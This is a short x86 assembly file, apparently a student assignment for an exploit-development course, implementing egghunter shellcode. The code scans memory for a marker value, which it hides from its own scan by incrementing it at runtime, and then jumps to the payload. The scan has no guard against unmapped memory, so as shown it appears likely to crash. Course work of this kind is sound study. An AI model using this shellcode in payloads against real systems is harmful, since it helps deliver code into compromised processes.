; SLAE-XXX
; copy paste need to make it original now
; assignment 3 : egghunter shellcode 
; originality : few instructions so hard to be original there, try to reduce size 

global _start

section .text

_start:
 xor eax,eax; 0 eax  
 mov ebx, dword 0x50905089 ; egg signature is different from what is hardcoded here , its a trick to not detect this exact address 
 inc ebx ; final egg code is in ebx

next_addr:
 inc eax    ; increasing memory address to look at next address
 cmp dword [eax], ebx ; check if our egg is at that memory address, if yes set ZF = 1
 jne next_addr  ; if ZF = 0 (check failed), then jmp to next_addr
 jmp eax ; if eax contains our eggcode, jump after it no ?
 
